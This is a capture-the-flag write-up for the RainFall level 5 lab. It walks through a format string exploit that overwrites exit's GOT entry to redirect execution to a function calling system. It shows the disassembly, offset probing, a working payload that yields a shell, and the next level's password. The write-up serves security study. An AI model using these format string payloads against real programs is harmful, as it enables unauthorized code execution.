# Level 05

## Analysis

## Attack type: Format string vulnerability to overwrite Global Offset Table (GOT)

We started by checking the file binary with objdump and found the following stuff:
```bash
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55                   	push   %ebp
 8048505:	89 e5                	mov    %esp,%ebp
 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave
 8048510:	c3                   	ret
 ```
 so we have 3 functions:
    - o that calls system and _exit
    - n that calls fgets and printf and then exit
    - main that calls n

We know that we can use the format string vulnerability to change the address of the exit function to the address of the o function, so we can call system and _exit.
That exploit is called GOT Overwrite.

We proceed to find the address of the exit function and then we can use the format string vulnerability to change it to the address of the o function:


```bash
level5@RainFall:~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
We can see that the address of the exit function is 0x08049838.
Then we search the address of the o function:
```bash
level5@RainFall:~$ objdump -d level5
```
We can see that the address of the o function is 0x80484a4

then we try to guess the offset of the printf format string vulnerability:
```bash
level5@RainFall:~$ ./level5
AAAA.%x.%x.%x.%x.%x
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e
```
We can see that the offset is 4:
```bash
level5@RainFall:~$ ./level5
AAAA%4$p
AAAA0x41414141
```
So we know that the offset is 4 and we can use the following payload to change the address of the exit function to the address of the o function:
```bash
(python -c 'import struct; print struct.pack("I", 0x8049838)+struct.pack("I", 0x804983a)+"%2044u%5$hn"+"%31904u%4$hn"'; cat) | ./level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
the exploit is a bit tricky to understand, but we can break it down:
- We use the exit address and we replace it by the o address
- 2044u is the decimal value of the higher part of the address (0x0804 in hex) minus the 8 bytes previously print
- 31904u is the decimal value of the lower part of the address (0x84a4 in hex) minus the (2044 + 8) bytes previously print
- %5$hn and %4$hn are used to write the values to the memory

Address de o: 0x0804 84a4
Higher: 0804 => 2044
Lower: 84a4 => 33956 (-2052) => 31904

[Reference](https://axcheron.github.io/exploit-101-format-strings/)
[Reference 2](https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/12-Format4.md)
